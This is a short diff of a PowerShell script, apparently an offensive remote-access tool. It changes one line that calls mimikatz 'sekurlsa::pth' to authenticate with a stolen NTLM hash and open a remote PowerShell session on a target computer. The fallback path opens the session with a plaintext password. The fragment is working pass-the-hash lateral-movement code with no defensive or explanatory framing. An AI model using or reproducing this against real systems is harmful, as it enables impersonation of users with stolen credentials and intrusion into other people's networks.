@@ -150,7 +150,7 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
       } until ($input -in '1','2','3','4')
 
 Write-Host ""
-if(Test-Path variable:global:PassTheHash) { powershell $mimipath\mimikatz.exe sekurlsa::pth /user:$user /ntlm:$hash /run:"powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" }
+if(Test-Path variable:global:PassTheHash) { powershell $mimipath\mimikatz.exe sekurlsa::pth /user:$user /ntlm:$ntlmpass /run:"powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" }
 else { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 $RDP = New-PSSession -Computer $computer -credential $credential }
 $Host.UI.RawUI.ForegroundColor = 'Yellow'
